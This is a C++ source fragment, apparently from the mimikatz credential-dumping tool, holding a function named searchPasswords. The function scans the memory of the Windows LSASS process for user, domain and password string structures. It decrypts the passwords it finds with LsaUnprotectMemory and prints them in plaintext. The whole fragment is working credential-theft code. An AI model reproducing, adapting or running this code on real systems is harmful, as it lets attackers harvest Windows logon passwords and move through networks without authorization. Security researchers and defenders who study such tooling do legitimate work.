bool mod_mimikatz_sekurlsa::searchPasswords(vector<wstring> * arguments)
{
	if(searchLSASSDatas())
	{
		if(PNT_QUERY_SYSTEM_INFORMATION NtQuerySystemInformation = reinterpret_cast<PNT_QUERY_SYSTEM_INFORMATION>(GetProcAddress(GetModuleHandle(L"ntdll"), "NtQuerySystemInformation")))
		{
#ifdef _M_X64
			PBYTE MmSystemRangeStart = reinterpret_cast<PBYTE>(0xffff080000000000);
#elif defined _M_IX86
			PBYTE MmSystemRangeStart = reinterpret_cast<PBYTE>(0x80000000);
#endif
			ULONG maTaille = 0;
			NtQuerySystemInformation(KIWI_SystemMmSystemRangeStart, &MmSystemRangeStart, sizeof(PBYTE), &maTaille);

			DWORD nbPossible = 0;
			for(PBYTE pMemoire = 0; pMemoire < MmSystemRangeStart ; )
			{
				MEMORY_BASIC_INFORMATION mesInfos;
				if(VirtualQueryEx(hLSASS, pMemoire, &mesInfos, sizeof(MEMORY_BASIC_INFORMATION)) > 0)
				{
					if((mesInfos.Protect & PAGE_READWRITE) && !(mesInfos.Protect & PAGE_GUARD) && (mesInfos.Type == MEM_PRIVATE))
					{
						UNICODE_STRING donnees[3];
						for(PBYTE pZone = reinterpret_cast<PBYTE>(mesInfos.BaseAddress); pZone < (reinterpret_cast<PBYTE>(mesInfos.BaseAddress) + mesInfos.RegionSize - 3*sizeof(UNICODE_STRING)); pZone += sizeof(DWORD))
						{
							if(mod_memory::readMemory(pZone, donnees, 3*sizeof(UNICODE_STRING), hLSASS))
							{
								if(
									(donnees[0].Length && !((donnees[0].Length & 1) || (donnees[0].MaximumLength & 1)) && (donnees[0].Length < sizeof(wchar_t)*0xff) && (donnees[0].Length <= donnees[0].MaximumLength) && donnees[0].Buffer) &&
									(donnees[1].Length && !((donnees[1].Length & 1) || (donnees[1].MaximumLength & 1)) && (donnees[1].Length < sizeof(wchar_t)*0xff) && (donnees[1].Length <= donnees[1].MaximumLength) && donnees[1].Buffer) &&
									(donnees[2].Length && !((donnees[2].Length & 1) || (donnees[2].MaximumLength & 1)) && (donnees[2].Length < sizeof(wchar_t)*0xff) && (donnees[2].Length <= donnees[2].MaximumLength) && donnees[2].Buffer)
									)
								{
									wstring user, domain, password;
									BYTE * bPassword = NULL;
									if(ressembleString(&donnees[0], &user) && ressembleString(&donnees[1], &domain) && !ressembleString(&donnees[2], NULL, &bPassword))
									{
										if(bPassword)
										{
											mod_mimikatz_sekurlsa::SeckPkgFunctionTable->LsaUnprotectMemory(bPassword, donnees[2].MaximumLength);
											password.assign(mod_text::stringOrHex(bPassword, donnees[2].Length, 0, false));
										}
										(*outputStream) << L"[" << nbPossible++ << L"] { " << user << L" ; " << domain << L" ; " << password << L" }" << endl;
									}

									if(bPassword)
										delete[] bPassword;
								}
							}
						}
					}
					pMemoire += mesInfos.RegionSize;
				}
				else break;
			}
		}
	}
	else (*outputStream) << L"Données LSASS en erreur" << endl;
	return true;
}